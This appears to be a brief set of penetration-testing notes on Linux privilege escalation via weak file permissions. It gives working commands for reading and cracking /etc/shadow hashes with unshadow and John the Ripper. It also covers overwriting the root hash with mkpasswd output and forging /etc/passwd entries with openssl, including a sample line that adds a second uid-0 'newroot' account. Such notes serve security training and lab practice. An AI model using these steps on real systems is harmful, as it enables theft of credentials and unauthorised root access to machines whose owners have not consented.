# weak file permissions

- From LinEnum.sh we will come to know if some of the sensitive files are readable/writable.

## check if /etc/shadow is readable

- if this is readable, you can read the hashes
- And try cracking with john or other hash cracker.
- `unshadow passwd shadow > unshadowed.txt`  
- `john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt`


## check if /etc/shadow is writable
- you can create a password `mkpasswd -m sha-512 newpasswordhere`
- replace the hash with the above hash & try logging in as root with the new password


## check if /etc/passwd is writable
- generate new password with `openssl` commands
- `openssl passwd 123456`
- with salt, `openssl passwd -1 -salt salt 123456`
```
root:$1$salty$slXoTphI2yZWpUbBQYyE4/:0:0:root:/root:/bin/bash
newroot:jvxnRnSKo6yD6:0:0:root:/root:/bin/bash
```
- try logging in as root & newroot user with the passwords
